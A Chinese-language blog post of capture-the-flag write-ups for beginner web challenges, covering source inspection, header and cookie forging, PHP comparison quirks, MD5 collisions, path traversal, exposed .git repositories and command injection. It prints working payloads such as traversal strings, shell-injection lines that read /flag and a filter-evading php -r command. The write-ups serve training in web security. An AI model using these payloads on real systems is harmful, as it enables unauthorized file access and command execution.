---
title: QingCenCTF-WEB入门
date: 2026-7-15 10:00:00
categories:
  - CTF刷题笔记
tags:
  - CTF
  - Web入门
  - QingCenCTF
description: QingCenCTF-WEB入门
cover: 
---

# QingCenCTF-web入门(待更新)

## BASIC

### basic

题目介绍里提示用f12

![image-20260918201528887](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918201528887.png)

发现flag

![image-20260918201641667](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918201641667.png)

### basic_1

![image-20260918202030054](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918202030054.png)

打开题目后发现不允许使用f12查看源码

![image-20260918202138133](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918202138133.png)

#### 方法一 使用view-source协议

在url前面加上view-source

![image-20260918202514327](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918202514327.png)

发现源码中存在base64编码，输入到cyberchef解码得flag

![image-20260918202700797](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918202700797.png)

#### 方法二：使用抓包工具进行抓包

这里我用的是burp suit,抓包之后放到重放器查看响应然后base64解码

![image-20260918203000524](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918203000524.png)

#### 方法三：使用curl

在终端中使用curl -k url查看源码

![image-20260918203234600](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918203234600.png)

### basic_2

题目提示将前端中的0该做1

![image-20260918203401278](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918203401278.png)

浏览代码发现只要将is_admin的值改从0改为1可以通过服务器校验

![image-20260918203823907](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918203823907.png)

![image-20260918203922403](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918203922403.png)

点击提交反馈之后获得flag

![image-20260918203955598](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918203955598.png)

### basic_3

提示控制台

![image-20260918204308092](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918204308092.png)

先信息收集，查看源码，发现前端路由

![image-20260918204659581](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918204659581.png)

发现一连串jsfuck,复制到控制台得到flag

![image-20260918204912912](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260918204912912.png)

### basic_4

查看源码，发现 `script src="/static/main.js"></script>`路由，进入后发现验证码的校验逻辑

![image-20260920185630423](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260920185630423.png)

直接解码得到邀请码`QCCTF_VIP_2026`

![image-20260920185705761](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260920185705761.png)

获得flag

![image-20260920185743020](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260920185743020.png)

### basic_5

提示需要1000分才能获得flag

![image-20260920190247625](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260920190247625.png)

抓包，发现可以修改data的值

![image-20260920190510429](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260920190510429.png)

![image-20260920190524144](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260920190524144.png)

将score改为1000然后放包

![image-20260920190613657](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260920190613657.png)

获得flag

![image-20260920190649051](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260920190649051.png)

### basic_6

#### 方法一：抓包工具抓包

打开容器后查看源代码发现没有其他路由，题目提示抓包

![image-20260920190947897](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260920190947897.png)

`ctrl+r`放到重放器点发送查看响应发现flag

![image-20260920191123827](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260920191123827.png)

#### 方法二：命令行工具

使用`curl -I url` 指令

![image-20260920191343381](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260920191343381.png)

### basic_7

进入后发现拼图，拼完后也妹有flag呀！

![image-20260920204705102](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260920204705102.png)

进行抓包,放到重放器发现会重定向，点击跟随重定向，得到flag

![image-20260920205615233](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260920205615233.png)

### basic_8

提示后缀可变，源码可窥说明源码泄露，这里发现访问index.phps显示源码，解释关键代码

![image-20260924090827540](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924090827540.png)

```
$a = $_GET["a"] ?? null;  //get获取参数a，不存在则为null
if (!isset($a) || $a != "QCyYdS") {
    renderPage('ç½‘ç«™å»ºè®¾ä¸­...',"\né™„ï¼šå¼€å‘æ–‡æ¡£æ­£åœ¨æ•´ç†ä¸­ï¼Œè¯·ç›¸å…³çš„æŠ€æœ¯äººå‘˜è®¿é—®ç½‘ç«™çš„æºä»£ç æ–‡ä»¶æ¥èŽ·å–ç›¸å…³ä¿¡æ¯ã€‚", false);
} //不能让if语句执行，get传参a=QCyYdS

$flag = trim(file_get_contents("/flag")); //读取服务器/flag文件
renderPage('éªŒè¯æˆåŠŸ', $flag, true); //校验通过后，把 flag 渲染到页面上
```

![image-20260924094935145](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924094935145.png)

### basic_9

robots.txt信息泄露，直接访问robots.txt

![image-20260924170248964](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924170248964.png)

![image-20260924170312302](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924170312302.png)





十六进制转字符得到flag

![image-20260924170422231](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924170422231.png)

### basic_10

提示在上一题学到什么，说明和上道题一样都是信息泄露，访问sitemap.xml

![image-20260924171905378](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924171905378.png)

![image-20260924172108424](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924172108424.png)

根据线索访问waw.php

![image-20260924172149031](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924172149031.png)

提示没有权限，伪造Cookie

![image-20260924172310276](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924172310276.png)

获得flag

![image-20260924172332920](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924172332920.png)

### basic_11

用目录扫描工具dirsearch扫面，发现fl4g.php,访问得到flag

![image-20260924200024620](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924200024620.png)

### basic_12

直接遍历参数id的值，发现当id=121时返回flag

![image-20260924200846970](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924200846970.png)

![image-20260924200902265](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924200902265.png)

### basic_13

直接用burp进行密码爆破

![image-20260924201217963](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924201217963.png)

这里爆出来密码admin123

![image-20260924202054915](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260924202054915.png)

### basic_14

------

在Liunx系统中，`/proc/self/fd`是一个特殊的目录，它映射了当前进程的**文件描述符表**。每个进程都有一个文件描述符表，其中包含了进程可以访问的文和其他资源（比如套接字、管道等）的描述符。文件描述符是进程用来访问文件或其他I/O资源的一个整数编号，通常情况下，标准输入、标准输出和标准错误分别编号0、1和2。

------

代码审计

```php
$flag = fopen('/admin_secret.txt', 'r'); //打开文件，只读模式
if (isset($_GET['filename']) && strlen($_GET['filename']) < 17) { //filename存在且长度必须小于17
  readfile($_GET['filename']); //任意文件读取
} else {
  echo "The filename parameter does not exist or the filename is too long";
} 
```

`/admin_secret.txt`大于17个字符，所以用`/proc/self/fd/数字`，这个数字不知道，需要爆破

![image-20260925115628457](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260925115628457.png)

## EZREQUEST

### ezrequest

#### 方式一：使用浏览器插件hackbar

首先get传参，参数是a，值为QCCTF

![image-20260921215349460](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260921215349460.png)

然后POST传参

![image-20260921215528707](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260921215528707.png)

得到flag

![image-20260921215552900](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260921215552900.png)

#### 方法二：工具抓包

![image-20260921215747071](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260921215747071.png)

![image-20260921215820521](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260921215820521.png)

其实这两种方法本质上是一样的

### ezrequest_1

------

首先需要先了解几个常见的请求头

Via请求头用于记录HTTP请求和响应经过的代理服务器信息，帮助追踪路径、防止循环并识别协议能力

Cookie请求头是浏览器在向服务器发送请求时附带的`Cookie: name=value; name2=value2`形式的http请求头,用于携带此前服务器通过`Set-Cookie`设置的所有匹配Cookie

X-Forwarded-For(XFF)请求头，用于记录客户端真实IP及请求经过的所有代理服务器IP

User-Agent请求头包含浏览器和系统信息，用于标识访问者

------

先用抓包工具抓包完成get和post请求

![image-20260923201042053](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260923201042053.png)

![image-20260923201105589](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260923201105589.png)

![image-20260923201130676](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260923201130676.png)

用X-Forwarded-For伪造IP

![image-20260923201246480](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260923201246480.png)

修改UA头信息伪造浏览器

![image-20260923201337277](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260923201337277.png)

添加Via头伪造代理

![image-20260923201422311](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260923201422311.png)

修改Cookie头伪造身份获得flag

![image-20260923201502043](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260923201502043.png)

## EZPHP

### ezphp

代码审计

```php
<?php
show_source(__FILE__); //输出一个带有PHP语法高亮的文件
include("flag.php");  //包含并运行指定文件
$a=@$_GET['a'];  //get传参a
$b=@$_GET['b'];  //get传参b
if($a and $a==0){  //找一个“真值但弱等于0”的字符串
    if(is_numeric($b)){ //is_numeeric()函数用于检测变量是否为数字或数字字符串，如果是则返回true，否则返回false，b不能全部是数字
        exit("nono"); //条件不满足就直接终止
    }else{
        if($b>2026){  //b的值大于2026
            echo $flag;
        }
    }
}else{
    exit("no"); //条件不满足就直接终止
}
?>
```

pyload

```
a=0.0&&b=2027a
```

![image-20260925123110452](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20260925123110452.png)

### ezphp_1

代码审计

```php
if (!isset($_GET['qc']) || $_GET['qc'] === '') exit("no");  //必须通过URL传入GET参数qc,且不能是空字符串
$qc = (array)json_decode($_GET['qc'], true); //把qc参数当作JSON字符串解析，true表示解析成数组（而不是对象），再强制转为数组
$key = array_search("QCCTF", $qc); //在qc参数的数组中搜寻值为“QCCTF”的元素，返回键名，找不到返回false
if($key === 1){  //要求返回的键严格等于整数1
    echo $flag;
}else{
    exit("no");
} 
```

pyload

```
?qc=["a","QCCTF"]
```

### ezphp_2

```php
if (!isset($_GET['qc']) || $_GET['qc'] === '') exit("no");  //必须通过URL传入GET参数qc,且不能是空字符串
$qc = (array)json_decode($_GET['qc'], true); //把qc参数当作JSON字符串解析，true表示解析成数组（而不是对象），再强制转为数组
if (!isset($qc["n"]) || !is_array($qc["n"]) || empty($qc["n"])) die("no");//判断数组 $qc 中是否有 "n" 这个键，且值不为 null或者检查是否为数组类型或者检查是否为“空”
if (array_search("QCCTF", $qc) === false) die("no...");//在 $qc 数组的所有“值”中查找字符串 "QCCTF"，找不到就终止脚本
if (array_search("QCyyds", $qc["n"]) === false) die("no...");//在 $qc["n"] 数组中查找 "QCyyds"，找不到就终止脚本
foreach ($qc["n"] as $val) { //遍历 $qc["n"] 数组的每一个元素，只要发现某个元素“严格等于”字符串 "QCyyds"，就立即终止脚本
    if ($val === "QCyyds") die("no......");
}
echo $flag;
```

利用 bool true：true == "QCyyds"（PHP 松散比较时字符串转 bool 为 true），但 true !== "QCyyds"。

![image-20261004153102861](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261004153102861.png)

### ezphp_3

第一步：get传入参数`qc`且令值为`Welcome to QingCen 2026!`因为是/i大小写没有限制

第二步：需要lover的值=2024

第三步：post传入Q和C,类型和值必须相等

第四步：post传入`ZJZ_QingCen.2026`且值为`Happy to see you!`后发现还是拿不到flag，

之后发现 PHP 7.4 的 `php_register_variable_ex` 源码有两个关键点：

1. 点号转下划线的循环遇到第一个 `[` 就 break——`[` 之后的点号不会被转换；
2. 方括号没有闭合的 `]` 时走 `plain_var` 回退分支：把 `[` 替换成 `_`，然后把整个名字原样注册为普通键。

所以传 `ZJZ[QingCen.2026`

![image-20261004164834471](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261004164834471.png)

## EZMD5

### ezmd5

`$admin_hash` 是 `0e` 开头纯数字——PHP 7 弱比较 `==` 把这种字符串按科学计数法解析，数值恒为 0。所以只需要找一个 md5 结果同样是 `0e`+全数字的字符串。

最经典的魔法字符串 `QNKCDZO` 的 md5 恰好就是本题的 `0e830400451993494058024219903391`

![image-20261004175211271](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261004175211271.png)

### ezmd5_1

题目没有对数组进行校验，直接数组绕过

```
?a[]=1&b[]=2
```

![image-20261004182046698](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261004182046698.png)

### ezmd5_2

和上题一样

![image-20261004182206635](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261004182206635.png)

### ezmd5_3

和上题一样

![image-20261004182323909](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261004182323909.png)

### ezmd5_4

`===` 严格比较 + 子串截取，魔法串和数组技巧全部失效，唯一出路是暴力搜索一个 md5 后缀为 `d54e23` 的字符串

```python
import hashlib
from multiprocessing import Pool

SUF = bytes.fromhex('d54e23')

def scan(rng):
    a, b = rng
    md5 = hashlib.md5
    for i in range(a, b):
        if md5(str(i).encode()).digest().endswith(SUF):
            return i
    return None

if __name__ == '__main__':
    CH = 1_000_000
    with Pool(8) as p:
        for res in p.imap_unordered(scan, [(i*CH, (i+1)*CH) for i in range(200)]):
            if res is not None:
                print("FOUND:", res)
                p.terminate()
                break
```

```
?QC=26120
```

![image-20261004185032534](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261004185032534.png)

### ezmd5_5

数组绕过

```
?a[]=1&b[]=2
```

### ezmd5_6

和上题一样

### ezmd5_7

弱比较

```
?a=%d1%31%dd%02%c5%e6%ee%c4%69%3d%9a%06%98%af%f9%5c%2f%ca%b5%87%12%46%7e%ab%40%04%58%3e%b8%fb%7f%89%55%ad%34%06%09%f4%b3%02%83%e4%88%83%25%71%41%5a%08%51%25%e8%f7%cd%c9%9f%d9%1d%bd%f2%80%37%3c%5b%d8%82%3e%31%56%34%8f%5b%ae%6d%ac%d4%36%c9%19%c6%dd%53%e2%b4%87%da%03%fd%02%39%63%06%d2%48%cd%a0%e9%9f%33%42%0f%57%7e%e8%ce%54%b6%70%80%a8%0d%1e%c6%98%21%bc%b6%a8%83%93%96%f9%65%2b%6f%f7%2a%70&b=%d1%31%dd%02%c5%e6%ee%c4%69%3d%9a%06%98%af%f9%5c%2f%ca%b5%07%12%46%7e%ab%40%04%58%3e%b8%fb%7f%89%55%ad%34%06%09%f4%b3%02%83%e4%88%83%25%f1%41%5a%08%51%25%e8%f7%cd%c9%9f%d9%1d%bd%72%80%37%3c%5b%d8%82%3e%31%56%34%8f%5b%ae%6d%ac%d4%36%c9%19%c6%dd%53%e2%34%87%da%03%fd%02%39%63%06%d2%48%cd%a0%e9%9f%33%42%0f%57%7e%e8%ce%54%b6%70%80%28%0d%1e%c6%98%21%bc%b6%a8%83%93%96%f9%65%ab%6f%f7%2a%70
```

![image-20261005152000412](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261005152000412.png)

## ezinfoleak

### ezinfoleak

打开系统异常日志发现base64编码

![image-20261005152748092](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261005152748092.png)

解码后发现是flag的文件

![image-20261005152818162](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261005152818162.png)

进行路径穿越

![image-20261005152848953](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261005152848953.png)

### ezinfoleak_1

和上题解法相同，但是对`../`进行过滤，采用双写绕过

```
?file=....//....//....//....//fl4g.txt
```

### ezinfoleak_2

这道题是AI做的Q_Q

```
/flag.txt.bak?download=1
```

![image-20261005164450781](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261005164450781.png)

回到页面底部那句提示：

> 请各位管理员在正式清理之前根据需要**自行完成相关数据的备份或导出**

这句话的字面意思就是答案：**管理员做过备份**。运维给单个文件做备份最常见的方式就是复制改名，后缀 `.bak`：

```
flag.txt  →  flag.txt.bak
```

于是对列表中的每个文件名追加备份后缀，逐个访问：

```
GET /flag.txt.bak
```

**命中**——返回一个 654 字节的 HTML 页，内容是一个 JS 自动下载器：

```
<script>
    window.onload = function() {
        var link = document.createElement('a');
        link.href = '/flag.txt.bak?download=1';   // ← 真正的下载地址
        link.download = 'flag.txt.bak';
        ...
        link.click();
    };
</script>
```

跟随它访问真正的下载地址：

```
GET /flag.txt.bak?download=1

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="flag.txt.bak"
Content-Length: 43
```

响应体（43 字节）：

```
flag{e1c1e8ba-723d-4836-aff1-342893d3c32b}
```

> 注意：列表里写的 "flag.txt 128B" 是诱饵（原文件已清理），遗留的备份 `flag.txt.bak` 才是真 flag。

### ezinfoleak_3

![image-20261005170156364](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261005170156364.png)

用dirsearch扫描访问后得到flag

![image-20261005170508120](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261005170508120.png)

### ezinfoleak_4

安装`git-dumper`（没有的话）

```
pip install git-dumper --break-system-packages
```

使用

```
git-dumper http://docker.qingcen.net:42545/.git/ ./dumped/
```

读取

```
cd dumped && cat flag.txt
```

### ezinfoleak_5

和上题类似，但是`git-dumper`出来的是HKBRLMlv.php后门文件

![image-20261006124652557](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261006124652557.png)

浏览器访问HKBRLMlv.php，POST传参token=get_flag

![image-20261006124801984](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261006124801984.png)

### ezinfoleak_6

和前两道题差不多，但是git-dumper后发现flag.txt被删除了

```
git log --oneline --all
3e9c582 (HEAD -> master) ezinfoleak: Remove flag.txt
5957c2e ezinfoleak: Add flag.txt
```

可以查找git历史

```
git show HEAD~1:flag.txt
```

![image-20261006125935689](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261006125935689.png)

## EZCMD

### ezcmd

escapeshellcmd 转义的是 `; & | \` $ ( )` 等**元字符**——它防的是"在合法命令后面**追加第二条命令**"。但这里用户控制的是**整条命令**：一条不含任何元字符的命令会**原样通过**，post传参

```
cmd=ls /
cmd=cat /flag
```

### ezcmd_1

使用; ||等符号绕过

```
cmd=;cat /flag
```

### ezcmd_2

`>/dev/null`会将回显的指令丢掉，使用`||` `;`过滤

```
cmd=cat /flag ||
```

### ezcmd_3

使用${IFS}绕过空格过滤

```
cmd=cat${IFS}/flag;
```

### ezcmd_4

访问robots.txt

![image-20261006140404285](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261006140404285.png)

访问4atP5Aup.php

![image-20261006140445042](https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oss-cn-beijing.aliyuncs.com/image-20261006140445042.png)

glob 字符类通配列出根目录4字符文件名

```
cmd=php -r print_r(glob($argv[1])); /[a-z][a-z][a-z][a-z]
```

glob 定位 /flag，fpassthru 输出

```
cmd=php -r $a=glob($argv[1])[0];fpassthru(fopen($a,r)); /fla[a-z]
```

